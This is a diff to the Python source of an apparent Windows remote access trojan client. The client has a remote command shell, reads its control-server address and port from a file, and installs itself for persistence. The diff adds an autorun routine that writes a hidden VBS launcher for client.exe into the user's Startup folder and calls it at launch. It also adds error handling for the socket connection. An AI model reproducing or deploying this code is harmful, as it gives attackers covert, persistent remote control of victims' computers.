@@ -12,9 +12,21 @@ import wmi
 import win32api
 import win32event
 import winerror
+import json
 
-host = "localhost"
+host = "192.168.0.42"
 port = 8080
+
+with open("address.txt") as file:
+    data = file.read()
+    js = json.loads(data)
+    print(js)
+    host = js["ip"]
+    port = js["port"]
+
+
+print(host)
+print(port)
 
 path = os.path.realpath(sys.argv[0])
 TMP = os.environ['APPDATA']
@@ -22,7 +34,14 @@ buff = 1024
 
 decode_utf = lambda data: data.decode("utf-8")
 receive = lambda buffer: objSocket.recv(buffer)
-send = lambda data: objSocket.send(data)
+
+
+def send(data):
+    try:
+        objSocket.send(data)
+    except ConnectionResetError:
+        print("Connection lost")
+
 
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 
@@ -135,12 +154,13 @@ def command_shell():
 
 def autorun():
     USER_NAME = getpass.getuser()
-    file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(os.path.realpath(__file__))
+    file_path = os.path.dirname(os.path.realpath("client.exe")) + "\\" + os.path.basename(
+        os.path.realpath("client.exe"))
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "open.vbs", "w+") as bat_file:
-        bat_file.write('cmd = "exe %s"\n' % file_path)
+        bat_file.write('cmd = "%s"\n' % file_path)
         bat_file.write('Set WShShell = CreateObject("WScript.Shell")\n')
-        bat_file.write('WshShell.Run cmd & Chr(34), 0\n')
+        bat_file.write('WshShell.Run cmd\n')  # for python file add: '& Chr(34), 0\n'
         bat_file.write("Set WshShell = Nothing\n")
 
 
@@ -151,6 +171,7 @@ def messageBox(message):
     subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
 
 
+autorun()
 server_connect()
 while True:
     try:
